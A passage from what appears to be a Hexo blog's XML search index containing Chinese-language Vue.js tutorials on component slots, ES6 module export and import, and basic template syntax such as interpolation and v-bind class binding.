class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="插槽slot"><a href="#插槽slot" class="headerlink" title="插槽slot"></a>插槽slot</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>组件的插槽是为了让我们封装的组件更加具有扩展性</li><li>让使用者可以决定组件内部的一些内容到底展示什么</li><li>这样，我们就可以自定义标签从而替换掉默认的slot插槽</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>我是替换插槽的按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>我是插槽默认值<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>嘿嘿嘿<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    components: &#123;</span><br><span class="line">      cpn: &#123;</span><br><span class="line"><span class="actionscript">        template: <span class="string">'#cpn'</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="具名插槽"><a href="#具名插槽" class="headerlink" title="具名插槽"></a>具名插槽</h2><p>当子组件的功能较为复杂，需要定义多个slot插槽时，我们该如何将插入内容和插槽一一对应起来呢</p><p>没错，就是为每一个插槽定义名字，从而让插入内容和插槽一一对应起来</p><p>语法如下<slot name="myslot"></slot></p><p>下面放出代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 默认情况下，定义的标签会将所有的无具名的slot标签一一替换掉 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;cpn&gt;&lt;button&gt;我是替换插槽的按钮&lt;/button&gt;&lt;/cpn&gt; --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- slot定义name属性，替换标签使用slot属性并将name属性定义的值填入其中 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">slot</span>=<span class="string">"center"</span>&gt;</span>我替换掉中间模块<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>左模块<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>= <span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>中间模块<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>右边模块<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>嘿嘿嘿<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    components: &#123;</span><br><span class="line">      cpn: &#123;</span><br><span class="line"><span class="actionscript">        template: <span class="string">'#cpn'</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="作用域插槽"><a href="#作用域插槽" class="headerlink" title="作用域插槽"></a>作用域插槽</h2><blockquote><p>首先先了解下什么是编译作用域</p><p><strong>编译作用域</strong>：父组件模板的所有东西都会在父级作用域内编译；子组件模板的所有东西都会在子级作用域内编译</p></blockquote><h3 id="slot-scope"><a href="#slot-scope" class="headerlink" title="slot-scope"></a>slot-scope</h3><p>我们如何在父组件里拿到子组件插槽的数据从而改变值的显示方式呢，这里就需要用到两个属性，一个是在插槽里动态绑定插槽数据，一个是slot-scope用来给父组件传递子组件的值</p><ul><li><p><slot :data="fruits">用来传递子组件的值</slot></p></li><li><p>父组件通过<code>slot-scope=&#39;slot&#39;</code>再通过slot.data就可以获取到刚才我们传入的data了</p></li></ul><p>下面放出案例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- vue旧版本需要用template去重新定义子组件的值 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 用slot-scope接收子组件的值 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span> <span class="attr">slot-scope</span>=<span class="string">'slot'</span>&gt;</span>&#123;&#123;slot.data.join(' * ')&#125;&#125;<span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 绑定子组件的值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">:data</span>=<span class="string">"fruits"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">'#app'</span>,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">    cpn: &#123; </span><br><span class="line"><span class="actionscript">      template: <span class="string">'#cpn'</span> ,</span></span><br><span class="line">      data() &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="actionscript">          fruits:[<span class="string">'🍈'</span>, <span class="string">'🍉'</span>, <span class="string">'🍊'</span>, <span class="string">'🍌'</span>, <span class="string">'🍎'</span>]</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-slot"><a href="#v-slot" class="headerlink" title="v-slot"></a>v-slot</h3><p>上面的slot-scope在最新的版本已经被抛弃了，改用v-slot，这里先放出代码直接看如何使用</p><p>父组件自定义插入内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:aaa</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span>+&#123;&#123;message.data.join(' * ')&#125;&#125;+<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>子组件插槽</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"aaa"</span> <span class="attr">:data</span>=<span class="string">"fruits"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用图描述这个过程</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%89%E3%80%81Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91/image-20200917084817891.png" alt="image-20200917084817891"></p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端模块化</title>
      <link href="/2021/03/01/%E5%89%8D%E7%AB%AF%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
      <url>/2021/03/01/%E5%89%8D%E7%AB%AF%E6%A8%A1%E5%9D%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<blockquote><p>当有一个团队要合作开发一个前端界面时， 不可避免的，每个人都会创建自己的js文件用于书写各自负责的部分代码，最终这些js代码会在一个页面被引用，那么，在这期间，每个人写的代码都会有各自的变量名，但是，某几个人的变量名可能会写的一样，这个时候，可能会引起作用域污染，导致代码不能正常执行。</p></blockquote><p>综合上面的案例，简而言之就是：<strong>前端代码复杂度变高，都写在一个文件里不太好，耦合性太高，难维护，全局变量被污染的可能性大。</strong></p><p>那怎么解决这个问题呢</p><ol><li>匿名函数的解决方案</li><li>使用模块作为出口</li></ol><p>先来说说第一个解决方法</p><p>先放出一段代码</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">true</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    &#125;)()</span><br></pre></td></tr></table></figure><p>这个方法有一个很明显的弊端，那就是另外一个文件中不容易使用flag，因为flag是一个函数内变量，所以，在ES6出现后，就出现了第二种解决方法-模块化</p><blockquote><p>优点：</p><ol><li><p>降低复杂度</p></li><li><p>降低耦合性</p></li><li><p>部署方便</p></li></ol></blockquote><p>我们使用export用来导出模块，用import来引入模块</p><p><strong>下面介绍几种导出用法</strong></p><ol><li><p>export {a,b,c}</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'大家好'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法一, 导出变量、函数</span></span><br><span class="line"><span class="keyword">export</span> &#123;a,b,c&#125;</span><br></pre></td></tr></table></figure></li><li><p>直接导出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> z = <span class="number">16</span></span><br></pre></td></tr></table></figure></li><li><p>直接导出类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    name= <span class="string">'小米'</span></span><br><span class="line">    age = <span class="number">16</span></span><br><span class="line">    c() &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'大家好，我叫'</span> + name + <span class="string">','</span> + <span class="string">'我今年'</span> + age + <span class="string">'岁了'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>默认导出模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'我是默认模块'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>导入的两种语用法</strong></p><ol><li><p>通用语法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;a,b,c...&#125; <span class="keyword">from</span> <span class="string">"./01-导出模块.js"</span></span><br></pre></td></tr></table></figure></li><li><p>在imports接收所有导出的模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> all <span class="keyword">from</span> <span class="string">"./01-导出模块.js"</span></span><br><span class="line"><span class="built_in">console</span>.log(all)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二、基础语法</title>
      <link href="/2021/03/01/%E4%BA%8C%E3%80%81Vue%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2021/03/01/%E4%BA%8C%E3%80%81Vue%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本节讲了Vue基础语法的使用，包括插值语法、动态绑定属性（v-bind）、计算属性（computed）、事件监听（v-on）、条件判断（v-if…）、v-if和v-show的不同、循环遍历（v-for）、过滤器的使用以及双向绑定（v-model）</p></blockquote><h1 id="插值语法"><a href="#插值语法" class="headerlink" title="插值语法"></a>插值语法</h1><h2 id="mustache"><a href="#mustache" class="headerlink" title="mustache"></a>mustache</h2><p>Vue.js 使用了基于 HTML 的模板语法，允许开发者声明式地将 DOM 绑定至底层 Vue 实例的数据。所有 Vue.js 的模板都是合法的 HTML，所以能被遵循规范的浏览器和 HTML 解析器解析。</p><ul><li>可以在模板中使用 JavaScript 表达式</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;a + b&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;a + ' ' + b&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;a + '' + b&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;c * 6&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">        message: <span class="string">'你好啊'</span>,</span></span><br><span class="line">        a: 1,</span><br><span class="line">        b: 2,</span><br><span class="line">        c: 3,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%8C%E3%80%81Vue%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200801173845681.png" alt="image-20200801173845681"></p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ol><li>v-once：只显示第一次的数据</li><li>v-text：解析为文本，同mustache</li><li>v-html：解析为html</li><li>v-cloak：等解析完后再显示数据</li><li>v-pre：不解析mustache语法</li></ol><h1 id="动态绑定属性（v-bind）"><a href="#动态绑定属性（v-bind）" class="headerlink" title="动态绑定属性（v-bind）"></a>动态绑定属性（v-bind）</h1><p><strong>作用</strong>：v-bind用于动态绑定一个或多个属性值，或者向另一个组件传递props值(这个学到组件时再介绍)</p><p><strong>缩写</strong>：<code>:</code></p><p><strong>预期</strong>：any (with argument) | Object (without argument)</p><p><strong>参数</strong>：attrOrProp (optional)</p><h2 id="动态绑定src以及href"><a href="#动态绑定src以及href" class="headerlink" title="动态绑定src以及href"></a>动态绑定src以及href</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">"imgUrl"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"500px"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">"url"</span>&gt;</span>Dong<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">el: <span class="string">'#app'</span>,</span></span><br><span class="line">data: &#123;</span><br><span class="line"><span class="actionscript">imgUrl: <span class="string">'https://ypigy.gitee.io/img/code.jpg'</span>,</span></span><br><span class="line"><span class="actionscript">url: <span class="string">'https://ypigy.gitee.io/'</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="动态绑定class（对象语法）"><a href="#动态绑定class（对象语法）" class="headerlink" title="动态绑定class（对象语法）"></a>动态绑定class（对象语法）</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使用函数返回类，注意函数小括号 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-bind:class</span>=<span class="string">"a()"</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 直接使用对象 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;h2 v-bind:class="&#123;pink:this.ispink,blue:this.isblue&#125;"&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">'change'</span>&gt;</span>点我变色<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">el: <span class="string">'#app'</span>,</span></span><br><span class="line">data: &#123;</span><br><span class="line"><span class="actionscript">message: <span class="string">'你好哦'</span>,</span></span><br><span class="line"><span class="actionscript">ispink: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">isblue: <span class="literal">false</span></span></span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="actionscript">change: <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.ispink = !<span class="keyword">this</span>.ispink</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="actionscript">a: <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> &#123;pink:<span class="keyword">this</span>.ispink,blue:<span class="keyword">this</span>.isblue&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="动态绑定class（数组语法）"><a href="#动态绑定class（数组语法）" class="headerlink" title="动态绑定class（数组语法）"></a>动态绑定class（数组语法）</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注意数组格式 ['a','b']和[a,b]的区别,'a'直接绑定类，a会根据寻找a值去找到对应的类名--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:class</span>=<span class="string">'[a,b]'</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;h2 :class="['a','b']"&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span 